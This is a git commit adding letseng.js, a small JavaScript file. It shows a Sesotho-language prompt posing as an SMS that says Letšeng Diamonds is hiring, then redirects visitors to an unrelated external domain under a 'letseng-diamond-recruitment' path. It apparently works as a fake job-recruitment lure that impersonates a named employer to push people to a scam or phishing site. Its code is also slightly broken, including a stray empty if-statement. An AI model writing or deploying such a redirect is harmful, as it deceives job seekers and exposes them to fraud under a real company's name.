7569301cc39aed6b089b46d03c8def76bef08d95
jesusboiz29 <circles15nuns@icloud.com>
2026-06-22 09:48:26 +0100

    Create letseng.js

---
+++ letseng.js
@@ -0,0 +1,6 @@
+var password = 'Ho hira LETŠENG DIAMONDS'
+password=prompt('SMS : LETŠENG DIAMONDS e ntse e hira batho ba bang, tobetsa OK ho etsa kopo ea ','Ho hira LETŠENG DIAMONDS');
+if (password != 'Ho hira LETŠENG DIAMONDS');
+if (password != 'Ho hira LETŠENG DIAMONDS') {
+location.href='https://www.itidofpeace.site/letseng-diamond-recruitment';
+}
